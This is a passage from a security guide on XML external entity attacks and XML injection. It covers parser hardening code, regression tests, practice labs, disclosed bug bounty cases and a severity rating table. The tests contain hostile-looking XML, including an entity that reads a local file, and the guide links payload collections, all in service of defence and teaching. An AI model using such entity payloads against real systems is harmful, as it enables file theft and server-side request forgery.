For SAX, leave `feature_external_ges` and `feature_external_pes` off (the default since Python 3.7.1). Check `pyexpat.EXPAT_VERSION` in the deployed interpreter: the Python documentation says Expat below 2.7.2 may be vulnerable to billion laughs, quadratic blowup and large-token attacks. In Django, the framework does not parse XML request bodies itself; if you add an XML parser to Django REST framework through a third-party package, check which parser it uses and wrap it with defusedxml if necessary. `defusedxml.lxml` is deprecated; harden the lxml parser as above instead.

### Node.js

Node has no XML parser in core, so the choice of library is the control:

- **libxmljs** (libxml2 binding): never set `noent: true` or `replaceEntities: true` on untrusted input, and set `nonet: true`. In libxmljs 1.x `noent` is a deprecated alias of `replaceEntities`. At the time of writing the package's last release was in 2023, so prefer a maintained pure-JavaScript parser where you can.
- **fast-xml-parser**: its DOCTYPE reader throws on external (`SYSTEM`) entities; internal entity processing is configurable. Keep the library updated, because entity-expansion limits have been the subject of advisories.
- **xml2js / sax**: pure JavaScript and, per WSTG, they do not resolve external entities; they are still exposed to expansion and size problems, so cap body size in your HTTP layer.

```javascript
const libxmljs = require("libxmljs");

function parseUntrusted(xml) {
  if (/<!DOCTYPE/i.test(xml)) {
    throw new Error("DOCTYPE not allowed");        // simple pre-check; parser options below are the real control
  }
  return libxmljs.parseXml(xml, { replaceEntities: false, nonet: true });
}
```

```javascript
// Express: only parse XML on routes that need it, with a size limit
const express = require("express");
const app = express();
app.post("/api/orders/notes", express.json({ limit: "100kb" }), addNote);          // JSON only
app.post("/b2b/orders", express.text({ type: ["application/xml", "text/xml"], limit: "1mb" }), b2bOrder);
```

### libxml2 and other native parsers

Do not pass `XML_PARSE_NOENT`, `XML_PARSE_DTDLOAD`, `XML_PARSE_DTDVALID` or `XML_PARSE_XINCLUDE` for untrusted input; add `XML_PARSE_NONET`; avoid `XML_PARSE_HUGE`. With libxml2 ≥ 2.13, `XML_PARSE_NO_XXE` keeps external entities blocked if substitution is unavoidable. The same applies to wrappers: Nokogiri's `noent`/`dtdload` options, Go programs using cgo bindings, and command-line tools in conversion pipelines (`xmllint --noent` and similar).

### SVG and Office uploads

- Decide whether you need SVG at all. If you only need raster images, reject SVG by **content**, not just by extension, and re-encode accepted images (ASVS `v5.0.0-5.2.2`).
- If you accept SVG, parse it with a hardened parser, remove the DOCTYPE, scripts, event-handler attributes, `foreignObject` and external references with a maintained sanitiser (ASVS `v5.0.0-1.3.4`; DOMPurify supports SVG profiles), and serve user SVGs from a separate origin with `Content-Disposition: attachment` or a restrictive CSP. Rasterising SVG server-side should happen in a sandbox with no network.
- For DOCX/XLSX/ODF, check the library's own XXE advisories and version (Apache POI, Tika, docx4j, PhpSpreadsheet, openpyxl and similar), limit uncompressed size and file count before extraction (ASVS `v5.0.0-5.2.3`), and run conversion in an isolated worker without access to secrets.

### Building XML without string concatenation

Use a DOM or streaming writer so the library encodes text and attribute values:

```java
XMLStreamWriter w = XMLOutputFactory.newDefaultFactory().createXMLStreamWriter(out, "UTF-8");
w.writeStartDocument("UTF-8", "1.0");
w.writeStartElement("order");
w.writeStartElement("note");
w.writeCharacters(userNote);          // encoded: <, >, & become entities
w.writeEndElement();
w.writeEndElement();
w.writeEndDocument();
w.close();
```

```python
from xml.etree.ElementTree import Element, SubElement, tostring

order = Element("order")
SubElement(order, "note").text = user_note            # encoded on serialisation
SubElement(order, "item", attrib={"sku": user_sku})   # attribute values encoded too
payload = tostring(order, encoding="utf-8", xml_declaration=True)
```

```php
<?php
$w = new XMLWriter();
$w->openMemory();
$w->startDocument('1.0', 'UTF-8');
$w->startElement('order');
$w->writeElement('note', $userNote);   // encoded
$w->endElement();
$xml = $w->outputMemory();
```

For SOAP, use the stack's generated client (JAX-WS, WCF, `SoapClient`, zeep) with typed parameters instead of templates. Also validate values against their business type (a quantity is an integer) before they go anywhere near the document; encoding prevents structure changes, validation prevents nonsense.

### Static analysis

| Tool | Rules (names as published at the time of writing) |
|---|---|
| Semgrep | `java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl-missing`, `…saxparserfactory-disallow-doctype-decl-missing`, `java.lang.security.xmlinputfactory-possible-xxe` (linked from the XXE Prevention Cheat Sheet), plus the registry's Python, PHP and C# XXE rules |
| CodeQL | `java/xxe` (Resolving XML external entity in user-controlled data), `cs/xml/insecure-dtd-handling`, `py/xxe`, `js/xxe`, `js/xml-bomb`, `java/xslt-injection` |
| Manual grep | The patterns in [GT-WEB-XXE-12](#gt-web-xxe-12-parser-configuration-review-and-expansion-limits) |

Make the hardened factory the only allowed way to create a parser, and add a custom rule that flags direct `DocumentBuilderFactory.newInstance()` (or the language equivalent) outside that class.

### Regression tests

Write tests that send hostile-looking XML to the **real** parsing path and assert it is rejected, without any test depending on network access:

```java
@Test
void rejectsDoctype() {
    String xml = "<?xml version=\"1.0\"?><!DOCTYPE n [<!ENTITY e \"x\">]><n>&e;</n>";
    assertThrows(SAXParseException.class,
        () -> SafeXml.documentBuilder().parse(new InputSource(new StringReader(xml))));
}

@Test
void apiRejectsXmlBodyOnJsonEndpoint() throws Exception {
    mockMvc.perform(post("/api/orders/notes").contentType(MediaType.APPLICATION_XML)
            .content("<OrderNote><orderId>1</orderId><note>x</note></OrderNote>"))
        .andExpect(status().isUnsupportedMediaType());
}
```

```python
import pytest
from defusedxml import DefusedXmlException

def test_external_entity_never_read(tmp_path):
    secret = tmp_path / "canary.txt"
    secret.write_text("GT-CANARY")
    xml = f'<!DOCTYPE n [<!ENTITY e SYSTEM "file://{secret}">]><n>&e;</n>'.encode()
    with pytest.raises((DefusedXmlException, ValueError)):
        parse_order(xml)
```

Also add: one fixture per accepted upload format with an entity pointing at a local test HTTP server, asserting no request arrives; an XInclude fixture; and a builder test asserting that `</note><x/>` survives as literal text. Run them in CI on every change to XML handling or document-library versions.

## Practice labs

PortSwigger Web Security Academy (free account needed):

- [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
- [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
- [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
- [Blind XXE with out-of-band interaction via XML parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
- [Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
- [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
- [Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
- [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
- [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)

The labs are where you practise the exfiltration and local-DTD techniques this note keeps in prose; they are built for it, and nobody else's data is involved.

**OWASP Juice Shop** has two XXE challenges, *XXE Data Access* and *XXE DoS*, both against its deprecated B2B interface. Juice Shop marks them as "Danger Zone" and disables them when it runs in Docker or on Heroku, so run Juice Shop from source on your own machine to attempt them. *XXE DoS* is the only place in this note where an entity-expansion payload is appropriate: your own local instance.

**OWASP WebGoat** includes an XXE lesson (`xxe` in the lessons tree) covering in-band, content-type-switching and blind variants.

## Real-world cases

- **X (Twitter), SXMP processor, 2017** — [HackerOne report 248668](https://hackerone.com/reports/248668), "XXE on sms-be-vip.twitter.com in SXMP Processor", disclosed in July 2017, rated Medium by the programme, bounty awarded (amount not shown). A `text/xml` SMS-gateway servlet resolved an external entity placed in a numeric field, and the value came back inside a "cannot convert to an integer" error: the error-based reflection pattern from [GT-WEB-XXE-7](#gt-web-xxe-7-agreed-file-read-and-error-based-disclosure). The reporter also confirmed outbound HTTP from the server.
- **WordPress media library on PHP 8, 2021** — [HackerOne report 1095645](https://hackerone.com/reports/1095645), "Authenticated XXE", reported by SonarSource, disclosed in May 2021, rated Medium, bounty awarded; tracked as CVE-2021-29447 and written up by [SonarSource](https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/). WordPress only called `libxml_disable_entity_loader()` on PHP below 8 (because the function is deprecated there) but still parsed audio metadata with `LIBXML_NOENT`, which turns entity substitution on. An author-level user uploading a crafted `.wav` file could trigger blind XXE. The textbook example of the PHP 8 assumption going wrong and of XML hiding inside a non-XML file type.
- **Elastic Enterprise Search web crawler, 2021** — [HackerOne report 1156748](https://hackerone.com/reports/1156748), "XXE in Enterprise Search's App Search web crawler", disclosed in April 2021, rated Critical, bounty awarded. The crawler followed the `sitemap` directive in an attacker's `robots.txt` and parsed the sitemap with external parameter entities enabled: the "server fetches XML you control" surface from [Feeds, sitemaps and imports the server fetches](#feeds-sitemaps-and-imports-the-server-fetches).
- **Google Toolbar button gallery, 2014** — [Detectify: How we got read access on Google's production servers](https://blog.detectify.com/best-practices/how-we-got-read-access-on-googles-production-servers/). The gallery let developers upload XML button definitions; the parser resolved external entities and returned local files. An early, well-known example of a "customisation upload" feature being an XML parser in disguise.

## Rating findings

Rate on what the parser lets an attacker reach (agreed-file read proves arbitrary file read by the process; OOB only proves resolution), who can reach the input (anonymous, any registered user, a privileged role, a partner), where the parser runs (the web tier, or a worker on another host with network reach) and what is readable or reachable from there. Series convention for Scope: **Scope Changed** when the impact clearly escapes the vulnerable component (requests from the server into other internal services, or a worker host whose file system and network belong to other systems); **Scope Unchanged** for file reads on the application's own host. CVSS v3.1 base scores do not capture "what is on the box"; say so and adjust the final severity in the reasoning.

| Finding | Typical severity | Example CVSS v3.1 vector | Reasoning |
|---|---|---|---|
| Unauthenticated XXE with agreed-file read (in-band or error-based) | High; Critical when the process can read keys or credentials and that was confirmed with approval | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | Any file the process can read is exposed; configuration files usually hold database and API credentials |
| Authenticated XXE with file read (any registered user) | High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5) | Registration is not a barrier; rate above the base score for the same reason as above |
| XXE with file read in a document or upload worker on a separate host | High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5) | A worker run for the same application is part of the vulnerable component; use `S:C` (7.7) only when that host's file system and network belong to other systems |
| XXE with confirmed internal network reach (SSRF via entities) | High | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` (8.6) | Requests come from inside the network; reach to internal services or metadata is described, not demonstrated, unless approved |
| OOB-only XXE (DNS/HTTP interaction, no file read shown) | Medium | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (5.3) | Resolution is proven but disclosure is not; rises to High as soon as file read or internal reach is shown |
| OOB-only XXE reachable only by a privileged role | Low to Medium | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N` (2.7) | Same proof level as the unprivileged OOB-only row. Admin-only upload or import; still a finding, and rated up to Medium, because admin accounts are phished and partner integrations are not always trusted |
| XInclude in a server-built document with agreed-file read | High | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | Same impact as entity-based file read, through a fragment only |
| User-controlled XSLT with extension functions or scripts enabled (from configuration) | Critical | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.8) | A stylesheet is code; with extensions it runs host-language code on the server as the application's account. Confirmed from configuration and processor identification, not by exploitation. Use `S:C` (9.9) only when escape is shown: the processor's host is shared with other systems or holds credentials for them |
| User-controlled XSLT with `document()` or includes reaching files or your collaborator | High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5) | File-read primitive by design; rate like authenticated XXE |
| Structural XML injection changing prices, identities or roles in a document a partner trusts | High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` (6.5) | Integrity of a trusted business message; rate higher when money or privileges move |
| Structural XML injection proven with a harmless marker only | Medium | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` (4.3) | Structure change is proven; impact depends on the receiver, which you describe |
| DTD processing with no expansion limits (from configuration; not tested live) | Medium | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` (7.5) | The vector describes a demonstrated outage; with configuration-only evidence, rate below it and say why |
| DTD accepted, internal entities expand, external resolution and limits confirmed absent | Low or Info | none | Hardening gap against ASVS `v5.0.0-1.5.1`; no external reach |
| JSON endpoint also parses XML, parser hardened | Info | none | Attack surface observation; recommend restricting media types |
| Verbose XML parser errors revealing stack and library versions | Low | none | Information disclosure that makes other findings easier (ASVS `v5.0.0-16.5.1`) |

When you report, include: the request with your collaborator subdomain or the agreed file, the response or collaborator log (source IP, time, `User-Agent`), which code path you believe parsed it, and a clear statement of what you did **not** do (no other files read, no internal requests, no DoS testing).

## Mapping

| Test | WSTG | ASVS 5.0 | CWE | OWASP Top 10 / API Top 10 |
|---|---|---|---|---|
| GT-WEB-XXE-1 | WSTG-INJT-07, WSTG-INFO-06, WSTG-APIT-01 | v5.0.0-1.5.1 (context) | CWE-611 (context) | A02:2025; API8:2023 |
| GT-WEB-XXE-2 | WSTG-INJT-07 | v5.0.0-1.5.1, v5.0.0-1.5.3 | CWE-611 | A02:2025; API8:2023 |
| GT-WEB-XXE-3 | WSTG-INJT-07, WSTG-ERRH-01 | v5.0.0-1.2.1, v5.0.0-16.5.1 | CWE-91 | A05:2025 |
| GT-WEB-XXE-4 | WSTG-INJT-07 | v5.0.0-1.5.1 | CWE-827, CWE-776 | A02:2025; API8:2023 |
| GT-WEB-XXE-5 | WSTG-INJT-07 | v5.0.0-1.5.1 | CWE-611 | A02:2025; API8:2023 |
| GT-WEB-XXE-6 | WSTG-INJT-07 | v5.0.0-1.5.1 | CWE-611, CWE-827 | A02:2025; API8:2023 |
| GT-WEB-XXE-7 | WSTG-INJT-07, WSTG-ERRH-01 | v5.0.0-1.5.1, v5.0.0-16.5.1 | CWE-611 | A02:2025; API8:2023 |
| GT-WEB-XXE-8 | WSTG-INJT-07 | v5.0.0-1.5.1, v5.0.0-1.2.1 | CWE-611, CWE-91 | A02:2025, A05:2025 |
| GT-WEB-XXE-9 | WSTG-INJT-07, WSTG-BUSL-08, WSTG-BUSL-09 | v5.0.0-1.5.1, v5.0.0-1.3.4, v5.0.0-5.2.2, v5.0.0-5.2.3 | CWE-611 | A02:2025; API8:2023 |
| GT-WEB-XXE-10 | WSTG-INJT-07 | v5.0.0-1.2.1 | CWE-91 | A05:2025 |
| GT-WEB-XXE-11 | WSTG-INJT-07 | v5.0.0-1.3.5 | CWE-611 (`document()` access); CWE-91 (context) | A05:2025 |
| GT-WEB-XXE-12 | WSTG-INJT-07 (white-box) | v5.0.0-1.5.1, v5.0.0-15.2.1, v5.0.0-15.2.2, v5.0.0-5.2.3 | CWE-611, CWE-776, CWE-827, CWE-91 | A02:2025, A05:2025 |

ASVS levels: `v5.0.0-1.5.1` L1 (restrictive XML parser configuration, external entities disabled), `v5.0.0-1.2.1` L1 (context-appropriate output encoding, including XML documents), `v5.0.0-1.3.4` L2 (user-supplied SVG sanitised), `v5.0.0-1.3.5` L2 (user-supplied XSL stylesheets and other template content sanitised or disabled), `v5.0.0-1.5.3` L3 (parsers for the same data type behave consistently), `v5.0.0-5.2.2` L1 (uploaded file content matches the expected type), `v5.0.0-5.2.3` L2 (compressed files checked for uncompressed size and file count), `v5.0.0-15.2.1` L1 (components within update time frames), `v5.0.0-15.2.2` L2 (defences against resource-demanding functionality), `v5.0.0-16.5.1` L2 (generic error messages).

CWE choice (statuses as listed by MITRE at the time of writing): **CWE-611** Improper Restriction of XML External Entity Reference is a Base entry, allowed for mapping, and the default for XXE. **CWE-776** Improper Restriction of Recursive Entity References in DTDs ("XML Entity Expansion") is Base, allowed, for missing expansion limits. **CWE-827** Improper Control of Document Type Definition is a Variant, allowed, for the specific case where the document chooses which DTD is loaded. **CWE-91** XML Injection (aka Blind XPath Injection) is Base but marked *Allowed-with-Review*: MITRE warns it is often confused with XXE and points XXE mappings to CWE-611, so use CWE-91 only for structural injection into XML the application builds.

Top 10: OWASP Top 10:2025 lists CWE-611 and CWE-776 under **A02:2025 Security Misconfiguration** and CWE-91 under **A05:2025 Injection**, so an XXE finding maps to A02 even though it is tested with injection techniques, and structural XML injection maps to A05. For APIs, an XXE-capable parser is a case of **API8:2023 Security Misconfiguration**.

## References

OWASP:

- [WSTG-INJT-07 Testing for XML Injection](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/07-XML_Injection/)
- [WSTG-INFO-06 Identify Application Entry Points](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points/)
- [WSTG-APIT-01 API Reconnaissance](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance/)
- [WSTG-BUSL-08 Test Upload of Unexpected File Types](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/08-Upload_of_Unexpected_File_Types/) and [WSTG-BUSL-09 Test Upload of Malicious Files](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/10-Business_Logic/09-Upload_of_Malicious_Files/)
- [WSTG-ERRH-01 Testing for Improper Error Handling](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/08-Error_Handling/01-Improper_Error_Handling/)
- [ASVS 5.0 V1 Encoding and Sanitization](https://github.com/OWASP/ASVS/blob/master/5.0/en/0x10-V1-Encoding-and-Sanitization.md)
- [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) and [XML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html)
- [OWASP Top 10:2025 A02 Security Misconfiguration](https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/) and [A05 Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)
- [OWASP API Security Top 10 2023: API8 Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/)

CWE:

- [CWE-611](https://cwe.mitre.org/data/definitions/611.html), [CWE-776](https://cwe.mitre.org/data/definitions/776.html), [CWE-827](https://cwe.mitre.org/data/definitions/827.html), [CWE-91](https://cwe.mitre.org/data/definitions/91.html)

PortSwigger:

- [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe), [Blind XXE](https://portswigger.net/web-security/xxe/blind), [XML entities](https://portswigger.net/web-security/xxe/xml-entities)
- [XML injection (issue definition)](https://portswigger.net/kb/issues/00100700_xml-injection) and [XML external entity injection (issue definition)](https://portswigger.net/kb/issues/00100c00_xml-external-entity-injection)
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) and the [Content Type Converter](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278) extension

Platform documentation:

- [Oracle JAXP Security Guide (Java 25)](https://docs.oracle.com/en/java/javase/25/security/java-api-xml-processing-jaxp-security-guide.html)
- [Spring `Jaxb2Marshaller`](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/oxm/jaxb/Jaxb2Marshaller.html)
- [.NET `XmlReaderSettings.DtdProcessing`](https://learn.microsoft.com/en-us/dotnet/api/system.xml.xmlreadersettings.dtdprocessing) and [`XmlDocument.XmlResolver`](https://learn.microsoft.com/en-us/dotnet/api/system.xml.xmldocument.xmlresolver)
- [PHP `libxml_disable_entity_loader` (deprecated)](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php), [`libxml_set_external_entity_loader`](https://www.php.net/manual/en/function.libxml-set-external-entity-loader.php), [libxml constants](https://www.php.net/manual/en/libxml.constants.php), [PHP 8.0 deprecations](https://www.php.net/manual/en/migration80.deprecated.php)
- [Python XML security](https://docs.python.org/3/library/xml.html), [defusedxml](https://github.com/tiran/defusedxml), [lxml FAQ](https://lxml.de/FAQ.html), [lxml parsing options](https://lxml.de/parsing.html) (the option list there may still describe the pre-5.0 `resolve_entities` default; the [lxml changelog](https://github.com/lxml/lxml/blob/master/CHANGES.txt) records the change)
- [libxmljs](https://github.com/libxmljs/libxmljs)
- [W3C XInclude](https://www.w3.org/TR/xinclude/)

Static analysis:

- [Semgrep rule: DocumentBuilderFactory without disallow-doctype-decl](https://semgrep.dev/r/java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl-missing.documentbuilderfactory-disallow-doctype-decl-missing)
- CodeQL: [java/xxe](https://codeql.github.com/codeql-query-help/java/java-xxe/), [cs/xml/insecure-dtd-handling](https://codeql.github.com/codeql-query-help/csharp/cs-xml-insecure-dtd-handling/), [py/xxe](https://codeql.github.com/codeql-query-help/python/py-xxe/), [js/xxe](https://codeql.github.com/codeql-query-help/javascript/js-xxe/), [js/xml-bomb](https://codeql.github.com/codeql-query-help/javascript/js-xml-bomb/), [java/xslt-injection](https://codeql.github.com/codeql-query-help/java/java-xslt-injection/)

Tools and further reading (detection aids; the exploitation material is for labs):

- [interactsh](https://github.com/projectdiscovery/interactsh), [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe), [XXEinjector](https://github.com/enjoiz/XXEinjector), [dtd-finder](https://github.com/GoSecure/dtd-finder)
- [Dean Fleming's .NET XML parser unit tests](https://github.com/deanf1/dotnet-security-unit-tests)
- [PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) and [XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)
- [HackTricks: XXE](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
- [Arseniy Sharoglazov: Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
